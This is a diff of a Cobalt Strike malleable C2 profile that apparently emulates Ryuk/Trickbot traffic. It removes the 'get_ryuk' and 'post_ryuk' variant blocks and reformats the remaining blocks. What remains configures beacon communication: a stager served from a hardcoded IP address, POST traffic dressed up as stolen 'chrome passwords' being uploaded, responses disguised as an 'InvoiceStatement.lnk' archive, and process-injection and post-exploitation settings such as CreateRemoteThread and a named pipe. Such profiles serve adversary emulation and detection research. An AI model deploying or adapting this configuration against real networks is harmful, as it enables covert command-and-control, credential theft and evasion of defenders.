@@ -102,136 +102,64 @@ http-get {
         output {
 
             netbios;
-            	       
-	    prepend "PK.........080..W.3
-	    	     ...1.....InvoiceStatement.lnk.Z_.^G..m.j.....\".....f{...
-	    	     7..464.v7.6M..b.o.m..&.M6.
-	    	     ....\"..E..|..P.(R%.J..A.....'..9g...L>....;..;3g........B..1S..
-	    	     3.........V....v.......|.....>";
 
-	    append ".....achor_dns.....";
+	        prepend "PK.........080..W.3...1.....InvoiceStatement.lnk.Z_.^G..m.j.....\".....f{...7..464.v7.6M..b.o.m..&.M6.....\"..E..|..P.(R%.J..A.....'..9g...L>....;..;3g........B..1S..3.........V....v.......|.....>";
+	        append ".....achor_dns.....";
 
             print;
         }
     }
 }
-
-#HTTP-GET VARIANT
-http-get "get_ryuk" {
- 
-    set uri "/files";
-
-    client {
-	   
-    metadata {
-
-        base64url;
-        prepend "SESSIONID=";
-        header "Cookie";
-
-    }
-
-    }
-
-    server {
- 
-        output {
-
-            netbios;
-            	       
-	    prepend "";
-
-	    append "";
-
-            print;
-        }
-    }
-}
-
-###HTTP-POST VARIANT###
-
-http-post "post_ryuk" {
-
-    set uri "/id";
-    set verb "GET";
-    
-    client {
-    
-        output {
-        netbios;
-        parameter "1";
-    }
-    id {
-	    base64url;
-	    parameter "id";
-
-        }
-    }
-    server {
-        output {
-        netbios;
-        print;
-     }
-    }
-}
-        
 
 ###HTTP-Post Block###
 
 http-post {
-    
+
     set uri "/ono19/ADMIN-DESKTOP.AC3B679F4A22738281E6D7B0C5946E42/81/";
-    #set verb "GET";
     set verb "POST";
 
     client {
 
 	header "Accept" "*/*";
-        #header "Host" "";
-        #header "Connection" "close";
         header "Content-Type" "multipart/form-data; boundary=-----------KMOGEEQTLQTCQMYE";
-	     
-        
+
         output {
+
             netbios;
-            #prepend "SESSIONID=";
-	    #header "COOKIE";
-	    prepend "-----------KMOGEEQTLQTCQMYE
-	    	     Content-Disposition: form-data; name=\"data\"
-	    	     
-	    	     https://nytimes.com/|Admin|";
-	    append "\n-----------KMOGEEQTLQTCQMYE
-	            Content-Disposition: form-data; name=\"source\"
-	            
-	            chrome passwords
-	            -----------KMOGEEQTLQTCQMYE--";
-	            
-	    print;
-	    
+
+            prepend "-----------KMOGEEQTLQTCQMYE";
+            prepend "Content-Disposition: form-data; name=\"data\"";
+            prepend "https://nytimes.com/|Admin|";
+
+            append "-----------KMOGEEQTLQTCQMYE";
+            append "Content-Disposition: form-data; name=\"source\"";
+            append "chrome passwords";
+            append "-----------KMOGEEQTLQTCQMYE--";
+
+            print;
+
         }
 
         id {
-	    base64url;
-	    parameter "id";
+
+            base64url;
+            parameter "id";
 
         }
     }
 
     server {
-    
+
         header "Connection" "close";
         header "Server" "Cowboy";
         header "Content-Type" "text/plain";
 
 
         output {
+
             netbios;
-            
-            prepend "/1/\n";
-            
-            append "";
-            
             print;
+
         }
     }
 }
@@ -243,14 +171,14 @@ http-stager {
     set uri_x64 "/Dd05ce3a-a9c9-4018-8252-d579eed1e670.zip";
 
     client {
-    
+
         header "Host" "51.254.25.115";
         header "Connection" "Keep-Alive";
-	
+
     }
 
     server {
-        
+
         header "Server" "Apache";
         header "Upgrade" "h2,h2c";
         header "Connection" "Upgrade, Keep-Alive";
@@ -259,15 +187,14 @@ http-stager {
         header "Accept-Ranges" "bytes";
         header "Vary" "Accept-Encoding,User-Agent";
         header "Keep-Alive" "timeout=5";
-	
-	output {
-	    
-	    print;
-	}
+
+        output {
+
+            print;
+        }
 
     }
 }
-
 
 ###Malleable PE/Stage Block###
 
@@ -285,13 +212,13 @@ stage {
     set stomppe	        "false";
     set obfuscate	"false";
     set rich_header     "bd8cf6bfbbaf89f44f2e0189ce41549f4d4c550a712cc5660619e4ac3b4adce9";
- 
-    #new 4.2. options   
+
+    #new 4.2. options
     #set allocator "HeapAlloc";
     #set magic_mx_x86 "MZRE";
     #set magic_mz_x64 "MZAR";
     #set magic_pe "PE";
-    
+
     set sleep_mask "false";
 
     #set module_x86 "wwanmm.dll";
@@ -329,14 +256,14 @@ stage {
 ###Process Inject Block###
 process-inject {
 
-    #set allocator "NtMapViewOfSection";		
+    #set allocator "NtMapViewOfSection";
 
     set min_alloc "16700";
 
-    set userwx "false";  
-    
+    set userwx "false";
+
     set startrwx "false";
-        
+
     transform-x86 {
         #prepend "\x90\x90\x90";
     }
@@ -346,7 +273,7 @@ process-inject {
 
     execute {
         CreateThread;
-        CreateRemoteThread;       
+        CreateRemoteThread;
 
         CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";
 
@@ -373,7 +300,7 @@ post-ex {
     set smartinject "false";
 
     set amsi_disable "false";
-    
+
     #new 4.2 options
     set thread_hint "ntdll.dll!RtlUserThreadStart";
     set pipename "DserNamePipe##";
